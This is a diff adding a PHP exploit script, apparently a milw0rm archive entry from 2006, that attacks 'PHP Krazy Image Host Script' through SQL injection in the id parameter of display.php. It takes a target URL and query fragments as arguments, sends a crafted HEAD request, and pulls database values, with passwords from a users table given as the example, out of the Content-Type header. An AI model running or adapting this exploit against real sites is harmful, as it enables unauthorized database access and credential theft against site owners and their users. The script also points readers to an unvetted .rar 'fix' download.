@@ -1,0 +1,52 @@
+<?
+/*****************************************************************\
+|* PHP Krazy Image Host Script (id) Remote SQL Injection Exploit *|
+|* Discovered by: Trex                                           *|
+|* Solution: http://www.trex-online.net/fixes/display.rar        *|
+|* Visit: Trex-Online.net / UnderGround.ag                       *|
+\*****************************************************************/
+
+error_reporting(0);
+
+echo "# PHP Krazy Image Host Script (id) Remote SQL Injection Exploit\n";
+echo "# Discovered by: Trex\n";
+echo "# Solution: http://www.trex-online.net/fixes/display.rar\n";
+echo "# Visit: Trex-Online.net / UnderGround.ag\n\n";
+echo "# Usage: $ php " . $_SERVER['PHP_SELF'] . " [URL] [PATH] [SELECT] [FROM] [WHERE]\n";
+echo "# Example: $ php " . $_SERVER['PHP_SELF'] . " http://localhost /images/ password users userID=1\n\n";
+
+if (!$_SERVER['argv'][5])
+	die();
+
+$url = parse_url($_SERVER['argv'][1] . $_SERVER['argv'][2]);
+
+$sql = "UNION+SELECT+1,1,1,1," . $_SERVER['argv'][3] . ",1,1,1+FROM+" . $_SERVER['argv'][4] . "+WHERE+" . $_SERVER['argv'][5] . "/*";
+
+echo "Connecting to " . $url['host'] . ":80 ... ";
+
+if (!$fsp = fsockopen($url['host'], 80, $errno, $errstr, $timeout))
+	die("failed.\nReason: " . $errno . " - " . $errstr);
+
+echo "done.\n\n";
+
+$request  = "HEAD " . $url['path'] . "display.php?id=0+" . $sql . " HTTP/1.1\r\n";
+$request .= "Host: " . $url['host'] . "\r\n";
+$request .= "Connection: Close\r\n\r\n";
+
+fputs($fsp, $request);
+
+while (!feof($fsp)) {
+	$response = fgets($fsp, 4096);
+	$response = explode(":", $response, 2);
+
+	if (count($response) == 2 && preg_match("/Content-Type/", $response[0]))
+		$result = $response[1];
+}
+
+if (preg_match("/text\/html/", $result))
+	echo "Exploit failed!";
+else
+	echo "Result: " . $result;
+?>
+
+# milw0rm.com [2006-09-29]
